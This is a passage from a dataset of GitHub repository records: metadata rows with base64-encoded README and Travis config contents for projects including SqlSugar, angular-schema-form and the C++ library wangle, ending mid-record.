KDEpOwpzZGIuVXBkYXRlKG9iaik7CiBgYGAKIAogCiBbPGZvbnQgY29sb3I9
cmVkPlZpZXcgbW9yZSA+PiA8L2ZvbnQ+XShodHRwczovL2dpdGh1Yi5jb20v
c3Vua2FpeHVhbi9TcWxTdWdhci93aWtpL2cuU2ltcGxlQ2xpZW50ICkgCiAg
CgojIENvZGUgZ2VuZXJhdG9yCmh0dHBzOi8vZ2l0aHViLmNvbS9zdW5rYWl4
dWFuL1NvRWFzeVBsYXRmb3JtCgojIE1vcmUgQVBpIOS4reaWh+aWh+aho++8
mgpodHRwOi8vd3d3LmNvZGVpc2J1Zy5jb20vRG9jLzgK
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'angular-schema-form',18065797,"b'Generate forms from a JSON schema, with AngularJS! '",b'JavaScript',128,2392,,2392,False,b'https://api.github.com/repos/json-schema-form/angular-schema-form/forks',"QW5ndWxhciBTY2hlbWEgRm9ybQo9PT09PT09PT09PT09PT09PT09ClshW25w
bSB2ZXJzaW9uXShodHRwczovL2ltZy5zaGllbGRzLmlvL25wbS92L2FuZ3Vs
YXItc2NoZW1hLWZvcm0uc3ZnP3N0eWxlPWZsYXQtc3F1YXJlKV0oaHR0cHM6
Ly93d3cubnBtanMub3JnL3BhY2thZ2UvYW5ndWxhci1zY2hlbWEtZm9ybSkK
WyFbbnBtIGRvd25sb2Fkc10oaHR0cHM6Ly9pbWcuc2hpZWxkcy5pby9ucG0v
ZG0vYW5ndWxhci1zY2hlbWEtZm9ybS5zdmc/c3R5bGU9ZmxhdC1zcXVhcmUp
XShodHRwOi8vbnBtLXN0YXQuY29tL2NoYXJ0cy5odG1sP3BhY2thZ2U9YW5n
dWxhci1zY2hlbWEtZm9ybSZmcm9tPTIwMTUtMDEtMDEpClshW0dpdHRlcl0o
aHR0cHM6Ly9pbWcuc2hpZWxkcy5pby9iYWRnZS9HSVRURVItSk9JTiUyMENI
QVQlMjAlRTIlODYlOTItZmY2OWI0LnN2Zz9zdHlsZT1mbGF0LXNxdWFyZSld
KGh0dHBzOi8vZ2l0dGVyLmltL2pzb24tc2NoZW1hLWZvcm0vYW5ndWxhci1z
Y2hlbWEtZm9ybT91dG1fc291cmNlPWJhZGdlJnV0bV9tZWRpdW09YmFkZ2Um
dXRtX2NhbXBhaWduPXByLWJhZGdlJnV0bV9jb250ZW50PWJhZGdlKQpbIVtC
dWlsZCBTdGF0dXNdKGh0dHBzOi8vaW1nLnNoaWVsZHMuaW8vdHJhdmlzL2pz
b24tc2NoZW1hLWZvcm0vYW5ndWxhci1zY2hlbWEtZm9ybS5zdmc/c3R5bGU9
ZmxhdC1zcXVhcmUpXShodHRwczovL3RyYXZpcy1jaS5vcmcvanNvbi1zY2hl
bWEtZm9ybS9hbmd1bGFyLXNjaGVtYS1mb3JtKQpbIVtDb2RlIENvdmVyYWdl
XShodHRwczovL2ltZy5zaGllbGRzLmlvL2NvdmVyYWxscy9qc29uLXNjaGVt
YS1mb3JtL2FuZ3VsYXItc2NoZW1hLWZvcm0uc3ZnP3N0eWxlPWZsYXQtc3F1
YXJlKV0oaHR0cHM6Ly9jb3ZlcmFsbHMuaW8vZ2l0aHViL2pzb24tc2NoZW1h
LWZvcm0vYW5ndWxhci1zY2hlbWEtZm9ybT9icmFuY2g9ZGV2ZWxvcG1lbnQp
CgpHZW5lcmF0ZSBmb3JtcyBmcm9tIEpTT04gc2NoZW1hcyB1c2luZyBBbmd1
bGFySlMhCgpXaHkgbm90IG1hbnkgY2hhbmdlcyBsYXRlbHk/Cj09PT09PT09
PT09PT09PT09PT09PT09PT09PT0KTXVjaCBvZiB0aGUgbmV3IGRldmVsb3Bt
ZW50IGlzIGJlaW5nIGRvbmUgaW4gW0Fzc2ltaWxhdGVdKGh0dHBzOi8vZ2l0
aHViLmNvbS9qc29uc2NoZW1hL2Fzc2ltaWxhdGUpLCBhIHN0YW5kYXJkaXNl
ZCB2YWxpZGF0b3IgZm9yIEpTT04gU2NoZW1hIHRvIGhlbHAgZW5zdXJlIGNo
YW5naW5nIHZhbGlkYXRvcnMgaXMgbmV2ZXIgYXMgcGFpbmZ1bCBhcyBlc2Nh
cGluZyB0djQgaXMsIGFzIHdlbGwgYXMgYSBuZXcgW2NvcmUgbGlicmFyeV0o
aHR0cHM6Ly9naXRodWIuY29tL2pzb24tc2NoZW1hLWZvcm0vanNvbi1zY2hl
bWEtZm9ybS1jb3JlKSB0byBhbGxvdyBmb3IgYSBtb3JlIHByZWRpY3RhYmxl
IHVwZ3JhZGUgZnJvbSBBbmd1bGFySlMgdG8gQW5ndWxhci4KClRoZSBCbG9n
IC8gVGhlIFdlYiBTaXRlIC8gVGhlIFR3aXR0ZXIgLyBUaGUgTW92aWUKPT09
PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
PQpbbWVkaXVtLmNvbS9AU2NoZW1hRm9ybUlPXShodHRwczovL21lZGl1bS5j
b20vQFNjaGVtYUZvcm1JTykgLyBbd2Vic2l0ZV0oaHR0cHM6Ly9qc29uLXNj
aGVtYS1mb3JtLmdpdGh1Yi5pby9hbmd1bGFyLXNjaGVtYS1mb3JtKSAvIFtA
U2NoZW1hRm9ybUlPXShodHRwOi8vdHdpdHRlci5jb20vU2NoZW1hRm9ybUlP
KSAvIFtNb3ZpZV0oaHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1k
dUJGTWlwUnEybykKCklmIHlvdSB1c2UgQVNGIGluIHlvdXIgcHJvamVjdC9j
b21wYW55IHBsZWFzZSBsZXQgdXMga25vdyEgV2UnZCBsb3ZlIHRvIGZlYXR1
cmUgeW91IG9uIHRoZSBzaXRlLgoKVGhlcmUgaGFzIGJlZW4gc29tZSByZWNl
bnQgZGV2ZWxvcG1lbnRzIGluIHRoaXMgcHJvamVjdCB0aGF0IHlvdSBtaWdo
dCB3YW50IHRvIFtyZWFkIGFib3V0XShodHRwczovL2dpdGh1Yi5jb20vanNv
bi1zY2hlbWEtZm9ybS9hbmd1bGFyLXNjaGVtYS1mb3JtL3dpa2kvUmVjZW50
LWRldmVsb3BtZW50cykuCgpEZW1vIFRpbWUhCj09PT09PT09PT0KW1RyeSBv
dXQgdGhlIGV4YW1wbGUgcGFnZV0oaHR0cDovL3NjaGVtYWZvcm0uaW8vZXhh
bXBsZXMvYm9vdHN0cmFwLWV4YW1wbGUuaHRtbCkuIFRyeSBlZGl0aW5nIHRo
ZSBzY2hlbWEgb3IgZm9ybSBkZWZpbml0aW9uIGFuZCBzZWUgd2hhdCBjb21l
cyBvdXQhCgpIaW50OiBCeSBwcmVzc2luZyB0aGUgJ1NhdmUgdG8gZ2lzdCcg
YnV0dG9uICh0b3AgbGVmdCksIHlvdSBjYW4gc2F2ZSB5b3VyIGV4YW1wbGUg
aW50byBhIHNoYXJlYWJsZSBsaW5rLgoKRG9jdW1lbnRhdGlvbgo9PT09PT09
PT09PT09CllvdSBjYW4gZmluZCBbYWxsIGRvY3VtZW50YXRpb24gaGVyZV0o
ZG9jcy9pbmRleC5tZCksIGl0IGNvdmVycyBhbGwgdGhlIGRpZmZlcmVudCBm
aWVsZCB0eXBlcwphbmQgdGhlaXIgb3B0aW9ucy4KCkl0IGFsc28gY292ZXJz
IGhvdyB0byBbZXh0ZW5kIGFuZ3VsYXIgc2NoZW1hIGZvcm0gd2l0aCB5b3Vy
IG93biBmaWVsZCB0eXBlc10oZG9jcy9leHRlbmRpbmcubWQpLgoKQmVmb3Jl
IGZpbGluZyBhbiBpc3N1ZSwgcGxlYXNlIHJlYWQgb3VyIFtpc3N1ZSBzdXBw
b3J0IGluc3RydWN0aW9uc10oZG9jcy9zdXBwb3J0Lm1kKSBvciB5b3UgbWF5
IGJlIGlnbm9yZWQuCgpXaGF0IGlzIGl0Pwo9PT09PT09PT09PQoKU2NoZW1h
IEZvcm0gaXMgYSBzZXQgb2YgQW5ndWxhckpTIGRpcmVjdGl2ZXMgKGFuZCBh
IGNvdXBsZSBvZiBzZXJ2aWNlcykuIEl0IGNhbiBkbyB0d28gdGhpbmdzIHRv
Cm1ha2UgbGlmZSBlYXNpZXI6CgoxLiBDcmVhdGUgYSBmb3JtIGRpcmVjdGx5
IGZyb20gYSBKU09OIHNjaGVtYS4KMi4gVmFsaWRhdGUgZm9ybSBmaWVsZHMg
YWdhaW5zdCB0aGF0IHNhbWUgSlNPTiBzY2hlbWEuCgpTY2hlbWEgRm9ybSB1
c2VzIGNvbnZlbnRpb24gb3ZlciBjb25maWd1cmF0aW9uLCBzbyBpdCBjb21l
cyBwYWNrYWdlZCB3aXRoIHNvbWUgc2Vuc2libGUgZGVmYXVsdHMuCkJ1dCB5
b3UgY2FuIGFsd2F5cyBjdXN0b21pemUgaXQgYnkgY2hhbmdpbmcgdGhlIG9y
ZGVyIGFuZCB0eXBlcyBvZiBmb3JtIGZpZWxkcy4KCiMjIyMgSlNPTiBGb3Jt
ClNjaGVtYSBGb3JtIGlzIGluc3BpcmVkIGJ5IHRoZSBuaWNlIFtKU09OIEZv
cm1dKGh0dHBzOi8vZ2l0aHViLmNvbS9qb3NoZmlyZS9qc29uZm9ybSkgbGli
cmFyeSBhbmQKYWltcyB0byBiZSByb3VnaGx5IGNvbXBhdGlibGUgd2l0aCBp
dCwgZXNwZWNpYWxseSBpdHMgZm9ybSBkZWZpbml0aW9uLiBTbyB3aGF0IHNl
dHMgU2NoZW1hIEZvcm0KYXBhcnQgZnJvbSBKU09OIEZvcm0/CgoxLiBTY2hl
bWEgRm9ybSBpbnRlZ3JhdGVzIGRlZXBseSB3aXRoIEFuZ3VsYXJKUyBhbmQg
dXNlcyBBbmd1bGFySlMgY29udmVudGlvbnMgdG8gaGFuZGxlIGZvcm1zLgoy
LiBTY2hlbWEgRm9ybSB1c2VzIFt0djRdKGh0dHBzOi8vZ2l0aHViLmNvbS9n
ZXJhaW50bHVmZi90djQpIGZvciB2YWxpZGF0aW9uLCBtYWtpbmcgaXQgY29t
cGF0aWJsZQogICB3aXRoIHZlcnNpb24gNCBvZiB0aGUgSlNPTiBzY2hlbWEg
c3RhbmRhcmQuCjMuIEJ5IGRlZmF1bHQsIFNjaGVtYSBGb3JtIGdlbmVyYXRl
cyBCb290c3RyYXAgMy1mcmllbmRseSBIVE1MLgoKTWlncmF0aW9uIEd1aWRl
Cj09PT09PT09PT09PT09PQpJZiB5b3UgYWxyZWFkeSB1c2UgdGhlIGxpYnJh
cnkgZmFjdG9yaWVzIGluIGFuIGFwcCBvciBhbiBhZGQtb24gb3IgcGxhbiB0
byB1cGdyYWRlIHZlcnNpb25zLCBwbGVhc2UgcmVhZCB0aGUgClttaWdyYXRp
b24gZ3VpZGVdKGRvY3MvbWlncmF0aW9uLm1kKSBmb3IgYW55IGl0ZW1zIHRo
YXQgbWF5IG5lZWQgY29uc2lkZXJhdGlvbi4KCkJhc2ljIFVzYWdlCi0tLS0t
LS0tLS0tCgpGaXJzdCwgZXhwb3NlIHlvdXIgc2NoZW1hLCBmb3JtLCBhbmQg
bW9kZWwgdG8gdGhlICRzY29wZS4KCmBgYGphdmFzY3JpcHQKYW5ndWxhci5t
b2R1bGUoJ215TW9kdWxlJywgWydzY2hlbWFGb3JtJ10pCiAgICAgICAuY29u
dHJvbGxlcignRm9ybUNvbnRyb2xsZXInLCBmdW5jdGlvbigkc2NvcGUpIHsK
ICAkc2NvcGUuc2NoZW1hID0gewogICAgdHlwZTogIm9iamVjdCIsCiAgICBw
cm9wZXJ0aWVzOiB7CiAgICAgIG5hbWU6IHsgdHlwZTogInN0cmluZyIsIG1p
bkxlbmd0aDogMiwgdGl0bGU6ICJOYW1lIiwgZGVzY3JpcHRpb246ICJOYW1l
IG9yIGFsaWFzIiB9LAogICAgICB0aXRsZTogewogICAgICAgIHR5cGU6ICJz
dHJpbmciLAogICAgICAgIGVudW06IFsnZHInLCdqcicsJ3NpcicsJ21ycycs
J21yJywnTmFOJywnZGonXQogICAgICB9CiAgICB9CiAgfTsKCiAgJHNjb3Bl
LmZvcm0gPSBbCiAgICAiKiIsCiAgICB7CiAgICAgIHR5cGU6ICJzdWJtaXQi
LAogICAgICB0aXRsZTogIlNhdmUiCiAgICB9CiAgXTsKCiAgJHNjb3BlLm1v
ZGVsID0ge307Cn0pOwpgYGAKClRoZW4gbG9hZCB0aGVtIGludG8gU2NoZW1h
IEZvcm0gdXNpbmcgdGhlIGBzZlNjaGVtYWAsIGBzZkZvcm1gLCBhbmQgYHNm
TW9kZWxgIGRpcmVjdGl2ZXMuCgpgYGBodG1sCjxkaXYgbmctY29udHJvbGxl
cj0iRm9ybUNvbnRyb2xsZXIiPgogICAgPGZvcm0gc2Ytc2NoZW1hPSJzY2hl
bWEiIHNmLWZvcm09ImZvcm0iIHNmLW1vZGVsPSJtb2RlbCI+PC9mb3JtPgo8
L2Rpdj4KYGBgCgpJbnN0YWxsYXRpb24KLS0tLS0tLS0tLS0tCgojIyMgTlBN
CgpgYGBiYXNoCm5wbSBpIGFuZ3VsYXItc2NoZW1hLWZvcm1AbGF0ZXN0CmBg
YApGb3IgdGhlIGxhdGVzdCBwcmUtcmVsZWFzZSAoYWxwaGEpCmBgYGJhc2gK
bnBtIGkgYW5ndWxhci1zY2hlbWEtZm9ybUBwcmUtcmVsZWFzZQpgYGAKCiMj
IyBCb3dlcgoKSXQncyBzaW1wbGVzdCB0byBpbnN0YWxsIFNjaGVtYSBGb3Jt
IHVzaW5nIFtCb3dlcl0oaHR0cDovL2Jvd2VyLmlvLykuCklmIHlvdSB1c2Ug
dGhlIGJvb3RzdHJhcCBkZWNvcmF0b3IgdXNlIHRoZSBvbmUgZnJvbSB0aGUg
YW5ndWxhci1zY2hlbWEtZm9ybS1ib290c3RyYXAgcmVwbwoKYGBgYmFzaApi
b3dlciBpbnN0YWxsIGFuZ3VsYXItc2NoZW1hLWZvcm0gYW5ndWxhci1zY2hl
bWEtZm9ybS1ib290c3RyYXAKYm93ZXIgaW5zdGFsbCBhbmd1bGFyLXNjaGVt
YS1mb3JtIGFuZ3VsYXItc2NoZW1hLWZvcm0tYm9vdHN0cmFwCmBgYAoKVGhp
cyB3aWxsIGluc3RhbGwgdGhlIGxhdGVzdCByZWxlYXNlIGFuZCBiYXNpYyBk
ZXBlbmRlbmNpZXMuIFNlZQpbZGVwZW5kZW5jaWVzIHNlY3Rpb24gYmVsb3dd
KCNkZXBlbmRlbmNpZXMpLgoKWW91IGNhbiBhbHNvIGxvYWQgdGhlIGZpbGVz
IHZpYSBbY2RuanMuY29tXShodHRwczovL2NkbmpzLmNvbS9saWJyYXJpZXMv
YW5ndWxhci1zY2hlbWEtZm9ybSkuCgojIyMgTWFudWFsCgpZb3UgY2FuIGFs
c28ganVzdCBkb3dubG9hZCB0aGUgY29udGVudHMgb2YgdGhlIGBkaXN0L2Ag
Zm9sZGVyIGFuZCBhZGQgZGVwZW5kZW5jaWVzIG1hbnVhbGx5LgoKIyMjIERl
cGVuZGVuY2llcwoKU2NoZW1hIGZvcm0gaGFzIGEgbG90IG9mIGRlcGVuZGVu
Y2llcywgbW9zdCBvZiB3aGljaCBhcmUgb3B0aW9uYWwuIFNjaGVtYSBGb3Jt
IGRlcGVuZHMgb246CgoxLiBbQW5ndWxhckpTXShodHRwczovL2FuZ3VsYXJq
cy5vcmcvKSB2ZXJzaW9uIDEuMy54IGlzIHJlY29tbWVuZGVkLiBWZXJzaW9u
IDEuMi54CiAgIGhhcyBzb21lIGxpbWl0YXRpb24uIFNlZSBba25vd24gbGlt
aXRhdGlvbnNdKGRvY3Mva25vd25saW1pdGF0aW9ucy5tZCkuCjIuIFthbmd1
bGFyLXNhbml0aXplXShodHRwczovL2RvY3MuYW5ndWxhcmpzLm9yZy9hcGkv
bmdTYW5pdGl6ZSkKMy4gW3R2NF0oaHR0cHM6Ly9naXRodWIuY29tL2dlcmFp
bnRsdWZmL3R2NCkKNC4gW2Jvb3RzdHJhcCAzXShodHRwOi8vZ2V0Ym9vdHN0
cmFwLmNvbS8pCgpJZiB5b3UgaW5zdGFsbCB2aWEgYm93ZXIgeW91IGdldCBh
bGwgb2YgdGhlIGFib3ZlIGV4Y2VwdCBib290c3RyYXAgc2luY2Ugd2UKZG9u
J3Qgd2FudCB0byBwdXNoIGEgY2VydGFpbiB2ZXJzaW9uIG9yIGZsYXZvciBv
biB5b3UuIEFsc28gbWFrZQpzdXJlIHlvdSBnb3QgdGhlIGFuZ3VsYXIgdmVy
c2lvbiB5b3UgYWN0dWFsbHkgd2FudC4KCiMjIyMgQWRkaXRpb25hbCBkZXBl
bmRlbmNpZXMKCjEuIElmIHlvdSdkIGxpa2UgdG8gdXNlIGRyYWctYW5kLWRy
b3AgcmVvcmRlcmluZyBvZiBhcnJheXMsIHlvdSdsbCBhbHNvIG5lZWQgW3Vp
LXNvcnRhYmxlXShodHRwczovL2dpdGh1Yi5jb20vYW5ndWxhci11aS91aS1z
b3J0YWJsZSkgYW5kIGl0cyBbalF1ZXJ5VUldKGh0dHA6Ly9qcXVlcnl1aS5j
b20vKSBkZXBlbmRlbmNpZXMuIFNlZSB0aGUgKnVpLXNvcnRhYmxlKiBkb2N1
bWVudGF0aW9uIGZvciBkZXRhaWxzIGFib3V0IHdoaWNoIHBhcnRzIG9mIGpR
dWVyeVVJIGFyZSBuZWVkZWQuIFlvdSBjYW4gc2FmZWx5IGlnbm9yZSB0aGVz
ZSBpZiB5b3UgZG9uJ3QgbmVlZCByZW9yZGVyaW5nLgoyLiBTY2hlbWEgRm9y
bSBwcm92aWRlcyB0YWJiZWQgYXJyYXlzIHRocm91Z2ggdGhlIGZvcm0gdHlw
ZSBgdGFiYXJyYXlgLiBUYWIgYXJyYXlzIGRlZmF1bHQgdG8gdGFicyBvbiB0
aGUgbGVmdCBzaWRlLiBGb3IgdGhlc2UgdG8gd29yaywgeW91J2xsIG5lZWQg
dG8gaW5jbHVkZSB0aGUgQ1NTIGZyb20gW2Jvb3RzdHJhcC12ZXJ0aWNhbC10
YWJzXShodHRwczovL2dpdGh1Yi5jb20vZGJ0ZWsvYm9vdHN0cmFwLXZlcnRp
Y2FsLXRhYnMpLiBIb3dldmVyLCB5b3Ugd29uJ3QgbmVlZCBCb290c3RyYXAg
VmVydGljYWwgVGFicyBmb3IgaG9yaXpvbnRhbCB0YWJzICh0aGUgYHRhYlR5
cGU6ICJ0b3AiYCBvcHRpb24pLgoKVGhlIG1pbmlmaWVkIGZpbGVzIGluY2x1
ZGUgdGVtcGxhdGVzIC0gbm8gbmVlZCB0byBsb2FkIGFkZGl0aW9uYWwgSFRN
TCBmaWxlcy4KCiMjIyBTY3JpcHQgTG9hZGluZwoKU2NoZW1hIGZvcm0gaXMg
c3BsaXQgaW50byB0d28gbWFpbiBmaWxlcywgYGRpc3Qvc2NoZW1hLWZvcm0u
bWluLmpzYCBhbmQKYGRpc3QvYm9vdHN0cmFwLWRlY29yYXRvci5taW4uanNg
IGFuZCB0aGV5IG5lZWQgYmUgbG9hZGVkIGluIHRoYXQgb3JkZXIuIEFuZ3Vs
YXJKUywKW3R2NF0oaHR0cHM6Ly9naXRodWIuY29tL2dlcmFpbnRsdWZmL3R2
NCkgYW5kIFtvYmplY3RwYXRoXShodHRwczovL2dpdGh1Yi5jb20vbWlrZS1t
YXJjYWNjaS9vYmplY3RwYXRoKQphbHNvIG5lZWRzIHRvIGJlIGxvYWRlZCAq
YmVmb3JlKiBTY2hlbWEgRm9ybS4KCmBgYGh0bWwKPHNjcmlwdCB0eXBlPSJ0
ZXh0L2phdmFzY3JpcHQiIHNyYz0iYm93ZXJfY29tcG9uZW50cy9hbmd1bGFy
L2FuZ3VsYXIubWluLmpzIj48L3NjcmlwdD4KPHNjcmlwdCB0eXBlPSJ0ZXh0
L2phdmFzY3JpcHQiIHNyYz0iYm93ZXJfY29tcG9uZW50cy9hbmd1bGFyLXNh
bml0aXplL2FuZ3VsYXItc2FuaXRpemUubWluLmpzIj48L3NjcmlwdD4KPHNj
cmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIHNyYz0iYm93ZXJfY29tcG9u
ZW50cy90djQvdHY0LmpzIj48L3NjcmlwdD4KPHNjcmlwdCB0eXBlPSJ0ZXh0
L2phdmFzY3JpcHQiIHNyYz0iYm93ZXJfY29tcG9uZW50cy9vYmplY3RwYXRo
L2xpYi9PYmplY3RQYXRoLmpzIj48L3NjcmlwdD4KPHNjcmlwdCB0eXBlPSJ0
ZXh0L2phdmFzY3JpcHQiIHNyYz0iYm93ZXJfY29tcG9uZW50cy9hbmd1bGFy
LXNjaGVtYS1mb3JtL2Rpc3Qvc2NoZW1hLWZvcm0ubWluLmpzIj48L3Njcmlw
dD4KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIHNyYz0iYm93ZXJf
Y29tcG9uZW50cy9hbmd1bGFyLXNjaGVtYS1mb3JtL2Rpc3QvYm9vdHN0cmFw
LWRlY29yYXRvci5taW4uanMiPjwvc2NyaXB0PgpgYGAKCiMjIyBNb2R1bGUg
bG9hZGluZwpEb24ndCBmb3JnZXQgdG8gbG9hZCB0aGUgYHNjaGVtYUZvcm1g
IG1vZHVsZSBvciBub3RoaW5nIHdpbGwgaGFwcGVuLgoKYGBgamF2YXNjcmlw
dAphbmd1bGFyLm1vZHVsZSgnbXlNb2R1bGUnLCBbJ3NjaGVtYUZvcm0nXSk7
CmBgYAoKIyMgQWRkLW9ucwpUaGVyZSBhcmUgc2V2ZXJhbCBhZGQtb25zIGF2
YWlsYWJsZSwgZm9yIGEgZnVsbCBsaXN0IHNlZSB0aGUgW3dlYiBwYWdlXSho
dHRwOi8vc2NoZW1hZm9ybS5pby8jL3RoaXJkLXBhcnR5LWFkZG9ucykuCllv
dXIgY2FuIGFsc28gW2NyZWF0ZSB5b3VyIG93biBhZGQtb25zIV0oZG9jcy9l
eHRlbmRpbmcubWQpCgojIyBDb250cmlidXRpbmcKQ29udHJpYnV0aW9ucyBh
cmUgd2VsY29tZSEgUGxlYXNlIHNlZSBbQ29udHJpYnV0aW5nLm1kXShDT05U
UklCVVRJTkcubWQpIGZvciBtb3JlIGluZm8uCgojIyBCdWlsZGluZwpUaGUg
bmV3IFdlYnBhY2sgY29tcGlsYXRpb24gaGFzIG1hZGUgaXQgZWFzaWVyIHRv
IG1hbmFnZSBmaWxlcyBhbmQgY29kZSBhbmQgcnVuIGJ1aWxkCnNjcmlwdHMs
IGJ1dCBpdCBpcyBzdGlsbCBub3QgZWFzeSBlbm91Z2ggZm9yIHVzZXJzIHVu
ZmFtaWxpYXIgd2l0aCBpdC4uLiB5ZXQuCgoqKk5PVEUqKiBpbiBvcmRlciB0
byBidWlsZCBzaW11bHRhbmVvdXNseSB3aXRoIGBgYGpzb24tc2NoZW1hLWZv
cm0tY29yZWBgYCB5b3UgbXVzdCBoYXZlIGl0IGNsb25lZAphcyBhIHNpYmxp
bmcgZGlyZWN0b3J5IHRvIHRoaXMgb25lICoqT1IqKiBucG0gaW5zdGFsbCB0
aGUgdmVyc2lvbiB5b3Ugd2lzaCB0byBidWlsZCB3aXRoLgoKV2VicGFjayBu
b3cgZ2VuZXJhdGVzIGEgaGVhZGVyIHRvIGluZGljYXRlIHZlcnNpb24gYW5k
IGRhdGUgb2YgYnVpbGQuICoqRG8gbm90IGNyZWF0ZSBQUiB3aXRoIHRoZSBE
SVNUIGZvbGRlci4qKgoKIyMgQnJhbmNoIFN0YXR1cyAmIE5ldyBBZGQtT24K
VGhpcyBicmFuY2ggd2lsbCBiZSB0aGUgKipuZXh0IHZlcnNpb24gb2YgQW5n
dWxhciBTY2hlbWEgRm9ybSoqLCBjdXJyZW50bHkgcGxlYXNlIHVzZQp0aGUg
KipleGFtcGxlcy9leGFtcGxlLmh0bWwqKiBmaWxlIGFzIHRoZSBiZXN0IGV4
YW1wbGUgdG8gZ2V0IHRoZSBmcmFtZXdvcmsgd29ya2luZy4KClRoZSBleGFt
cGxlIHVzZXMgKiphbmd1bGFyLXNjaGVtYS1mb3JtLmpzKiogYW5kICoqYW5n
dWxhci1zY2hlbWEtZm9ybS1ib290c3RyYXAuanMqKiBmb3IgdGhlCnZlcnNp
b24gb2YgdGhlIGNvZGUgaXQgZXhlY3V0ZXMsIGlmIHlvdSB3YW50IHlvdXIg
cGFnZSB0byBiZWhhdmUgdGhlIHNhbWUgeW91Cm9idmlvdXNseSBuZWVkIHRo
ZSBzYW1lIHZlcnNpb24hCgojIyMgQWRkLW9uClRvIHNlZSBob3cgdG8gbWFr
ZSBhbiAqKmFkZC1vbioqIHdvcmsgSSBoYXZlIG5vdyBpbmNsdWRlZCB0aGUg
KipjYWxjdWxhdGUqKiBhZGQtb24gZmlsZSB3aXRoaW4gdGhlICoqZXhhbXBs
ZXMvYWRkLW9uKiogZGlyZWN0b3J5LgoKIyMgVGVzdHMKVW5pdCB0ZXN0cyBh
cmUgcnVuIHdpdGggW2thcm1hXShodHRwOi8va2FybWEtcnVubmVyLmdpdGh1
Yi5pbykgYW5kIHdyaXR0ZW4gdXNpbmcKW21vY2hhXShodHRwOi8vbW9jaGFq
cy5vcmcvKSwgW2NoYWldKGh0dHA6Ly9jaGFpanMuY29tLykgYW5kCltzaW5v
bl0oaHR0cDovL3Npbm9uanMub3JnLykKClRvIHJ1biB0aGUgdGVzdHM6Cgox
LiBJbnN0YWxsIGFsbCBkZXBlbmRlbmNpZXMgdmlhIE5QTS4KMi4gSW5zdGFs
bCBkZXYgZGVwZW5kZW5jaWVzIHdpdGggYm93ZXIuCjMuIEluc3RhbGwgdGhl
IEthcm1hIENMSS4KNC4gUnVuIHRoZSB0ZXN0cyB1c2luZyBgbnBtIHRlc3Rg
LgoKYGBgYmFzaAokIG5wbSBpbnN0YWxsCiQgYm93ZXIgaW5zdGFsbAokIG5w
bSB0ZXN0CmBgYAo=
",,"bGFuZ3VhZ2U6IG5vZGVfanMKbm9kZV9qczoKICAtIDYKCmJlZm9yZV9zY3Jp
cHQ6CiAgLSBucG0gaW5zdGFsbCAtZyBib3dlcgogIC0gYm93ZXIgaW5zdGFs
bAoKc3VkbzogZmFsc2UK
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'wangle',27889694,"b'Wangle is a framework providing a set of common client/server abstractions for building services in a consistent, modular, and composable way.'",b'C++',46,2392,,2392,False,b'https://api.github.com/repos/facebook/wangle/forks',"WyFbVHJhdmlzIEJ1aWxkIFN0YXR1c10oaHR0cHM6Ly9hcGkudHJhdmlzLWNp
LmNvbS9mYWNlYm9vay93YW5nbGUuc3ZnP2JyYW5jaD1tYXN0ZXIpXShodHRw
czovL3RyYXZpcy1jaS5jb20vZmFjZWJvb2svd2FuZ2xlKQpbIVtDSSBTdGF0
dXNdKGh0dHBzOi8vZ2l0aHViLmNvbS9mYWNlYm9vay93YW5nbGUvd29ya2Zs
b3dzL0NJL2JhZGdlLnN2Zz9icmFuY2g9bWFzdGVyKV0oaHR0cHM6Ly9naXRo
dWIuY29tL2ZhY2Vib29rL3dhbmdsZS9hY3Rpb25zP3dvcmtmbG93PUNJKQo8
c2VjdGlvbiBjbGFzcz0iZGV4X2d1aWRlIj48aDEgY2xhc3M9ImRleF90aXRs
ZSI+V2FuZ2xlPC9oMT48c2VjdGlvbiBjbGFzcz0iZGV4X2RvY3VtZW50Ij48
aDE+PC9oMT48cCBjbGFzcz0iZGV4X2ludHJvZHVjdGlvbiI+QysrIG5ldHdv
cmtpbmcgbGlicmFyeTwvcD48cD5XYW5nbGUgaXMgYSBsaWJyYXJ5IHRoYXQg
bWFrZXMgaXQgZWFzeSB0byBidWlsZCBwcm90b2NvbHMsIGFwcGxpY2F0aW9u
IGNsaWVudHMsIGFuZCBhcHBsaWNhdGlvbiBzZXJ2ZXJzLjwvcD4KCjxwPkl0
JiMwMzk7cyBsaWtlIE5ldHR5ICsgRmluYWdsZSBzbW9vc2hlZCB0b2dldGhl
ciwgYnV0IGluIEMrKzwvcD4KCiMjIEJ1aWxkaW5nIGFuZCBJbnN0YWxsaW5n
CgpUaGUgbWFpbiBkZXBlbmRlbmNpZXMgYXJlOgoqIFRoZSBmb2xseSBsaWJy
YXJ5IGZyb20gaHR0cHM6Ly9naXRodWIuY29tL2ZhY2Vib29rL2ZvbGx5Ciog
VGhlIGZpenogbGlicmFyeSBmcm9tIGh0dHBzOi8vZ2l0aHViLmNvbS9mYWNl
Ym9va2luY3ViYXRvci9maXp6CiogQ01ha2UKKiBPcGVuU1NMLCBhdCBsZWFz
dCB2ZXJzaW9uIDEuMC4yKywgcHJlZmVyYWJseSB3aXRoIFRMUyBleHRlbnNp
b24gc3VwcG9ydC4KCk9uY2UgZm9sbHkgaXMgaW5zdGFsbGVkLCBydW4gdGhl
IGZvbGxvd2luZyBpbnNpZGUgdGhlIHdhbmdsZSBkaXJlY3RvcnkgdG8gYnVp
bGQsIHRlc3QsIGFuZCBpbnN0YWxsIHdhbmdsZToKYGBgCmNtYWtlIC4KbWFr
